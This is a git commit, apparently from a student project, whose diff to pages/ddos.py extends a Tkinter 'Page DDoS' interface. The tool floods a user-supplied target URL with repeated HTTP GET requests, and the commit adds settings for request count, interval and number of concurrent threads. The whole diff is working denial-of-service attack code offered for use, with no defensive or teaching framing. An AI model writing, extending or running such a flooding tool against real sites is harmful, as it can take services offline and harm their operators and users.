0dfb6a546d492e0837c5d449dfb4c9649b23a906
Jean-Félicien <jfgo61322@eleve.isep.fr>
2024-11-24 11:49:19 +0100

    feat: ddos options supplémentaires

--- pages/ddos.py
+++ pages/ddos.py
@@ -1,15 +1,32 @@
 import tkinter as tk
 import requests
 from threading import Thread
+import time
 
 class DdosPage(tk.Frame):
     def __init__(self, parent, controller):
         super().__init__(parent)
-        label = tk.Label(self, text="Page DDoS", font=("Arial", 16))
-        label.pack(pady=20)
+        labelAttack = tk.Label(self, text="Page DDoS", font=("Arial", 16))
+        labelAttack.pack(pady=20)
         
+        tk.Label(self, text="URL cible :").pack(pady=5)
         self.url_entry = tk.Entry(self, width=40)
         self.url_entry.pack(pady=10)
+        
+        tk.Label(self, text="Nombre de requêtes :").pack(pady=5)
+        self.nbRequestsVar = tk.StringVar(value="100")
+        nbRequestsDropdown = tk.OptionMenu(self, self.nbRequestsVar, "50", "100", "200", "500", "1000")
+        nbRequestsDropdown.pack(pady=5)
+        
+        tk.Label(self, text="Intervalle entre requêtes (secondes) :").pack(pady=5)
+        self.requestsInterval = tk.Entry(self, width=10)
+        self.requestsInterval.insert(0, "0.1")  # Intervalle par défaut
+        self.requestsInterval.pack(pady=5)
+        
+        tk.Label(self, text="Nombre de threads :").pack(pady=5)
+        self.threadsEntry = tk.Entry(self, width=10)
+        self.threadsEntry.insert(0, "1")  # Nombre de threads par défaut
+        self.threadsEntry.pack(pady=5)
         
         self.start_button = tk.Button(self, text="Lancer l'attaque DDoS", command=self.start_attack)
         self.start_button.pack(pady=10)
@@ -19,15 +36,23 @@ class DdosPage(tk.Frame):
     
     def start_attack(self):
         url = self.url_entry.get()
+        numRequests = int(self.nbRequestsVar.get())
+        interval = float(self.requestsInterval.get())
+        numThreads = int(self.threadsEntry.get())
+        
         if url:
             self.status_label.config(text="Lancement en cours...")
-            thread = Thread(target=self.ddos_attack, args=(url,))
-            thread.start()
+            # On attaque autant de fois qu'il y a de nombre de threads
+            for _ in range(numThreads):
+                thread = Thread(target=self.ddos_attack, args=(url, numRequests, interval))
+                thread.start()
     
-    def ddos_attack(self, url):
+    def ddos_attack(self, url, num_requests, interval):
         try:
-            for _ in range(100):
+            for _ in range(num_requests):
                 requests.get(url)
+                time.sleep(interval)  # Pause entre les requêtes
             self.status_label.config(text="Attaque terminée !")
         except Exception as e:
             self.status_label.config(text=f"Erreur : {e}")
+            
